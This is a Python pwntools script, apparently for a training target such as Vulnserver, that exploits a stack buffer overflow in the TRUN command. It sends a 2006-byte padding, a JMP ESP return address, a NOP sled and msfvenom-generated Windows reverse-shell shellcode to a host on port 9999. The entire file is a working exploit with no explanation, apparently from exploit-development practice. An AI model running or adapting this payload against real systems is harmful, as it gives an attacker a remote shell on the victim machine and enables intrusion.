from pwn import *

io=remote('192.168.1.21', 9999)


#msfvenom -p windows/shell_reverse_tcp --platform windows LHOST= LPORT= -f python  -b '\xff\xa0\x00' EXITFUNC=thread

buf =  b""
buf += b"\xba\xd3\xe7\x86\xfb\xdb\xd3\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x85\xe9\x64"
buf += b"\x0e\xd5\x1e\xea\xf1\x25\xdf\x8b\x78\xc0\xee\x8b\x1f"
buf += b"\x81\x41\x3c\x6b\xc7\x6d\xb7\x39\xf3\xe6\xb5\x95\xf4"
buf += b"\x4f\x73\xc0\x3b\x4f\x28\x30\x5a\xd3\x33\x65\xbc\xea"
buf += b"\xfb\x78\xbd\x2b\xe1\x71\xef\xe4\x6d\x27\x1f\x80\x38"
buf += b"\xf4\x94\xda\xad\x7c\x49\xaa\xcc\xad\xdc\xa0\x96\x6d"
buf += b"\xdf\x65\xa3\x27\xc7\x6a\x8e\xfe\x7c\x58\x64\x01\x54"
buf += b"\x90\x85\xae\x99\x1c\x74\xae\xde\x9b\x67\xc5\x16\xd8"
buf += b"\x1a\xde\xed\xa2\xc0\x6b\xf5\x05\x82\xcc\xd1\xb4\x47"
buf += b"\x8a\x92\xbb\x2c\xd8\xfc\xdf\xb3\x0d\x77\xdb\x38\xb0"
buf += b"\x57\x6d\x7a\x97\x73\x35\xd8\xb6\x22\x93\x8f\xc7\x34"
buf += b"\x7c\x6f\x62\x3f\x91\x64\x1f\x62\xfe\x49\x12\x9c\xfe"
buf += b"\xc5\x25\xef\xcc\x4a\x9e\x67\x7d\x02\x38\x70\x82\x39"
buf += b"\xfc\xee\x7d\xc2\xfd\x27\xba\x96\xad\x5f\x6b\x97\x25"
buf += b"\x9f\x94\x42\xe9\xcf\x3a\x3d\x4a\xbf\xfa\xed\x22\xd5"
buf += b"\xf4\xd2\x53\xd6\xde\x7a\xf9\x2d\x89\x44\x56\x2c\x52"
buf += b"\x2d\xa5\x2e\x65\x16\x20\xc8\x0f\x78\x65\x43\xb8\xe1"
buf += b"\x2c\x1f\x59\xed\xfa\x5a\x59\x65\x09\x9b\x14\x8e\x64"
buf += b"\x8f\xc1\x7e\x33\xed\x44\x80\xe9\x99\x0b\x13\x76\x59"
buf += b"\x45\x08\x21\x0e\x02\xfe\x38\xda\xbe\x59\x93\xf8\x42"
buf += b"\x3f\xdc\xb8\x98\xfc\xe3\x41\x6c\xb8\xc7\x51\xa8\x41"
buf += b"\x4c\x05\x64\x14\x1a\xf3\xc2\xce\xec\xad\x9c\xbd\xa6"
buf += b"\x39\x58\x8e\x78\x3f\x65\xdb\x0e\xdf\xd4\xb2\x56\xe0"
buf += b"\xd9\x52\x5f\x99\x07\xc3\xa0\x70\x8c\xe3\x42\x50\xf9"
buf += b"\x8b\xda\x31\x40\xd6\xdc\xec\x87\xef\x5e\x04\x78\x14"
buf += b"\x7e\x6d\x7d\x50\x38\x9e\x0f\xc9\xad\xa0\xbc\xea\xe7"

eip_crash_buffer = 2006

esp_location = p32(0x625011EB) # Turn's address into little endian \xf3\x12\x17\x31

nop_sled = asm('nop') * (50)  # Creates \x90 * 50 Which means No Operation

payload = b'A' * eip_crash_buffer + esp_location + nop_sled + buf

io.sendline(b"TRUN ."+payload)
io.sendline("\r\n")
io.recvline()
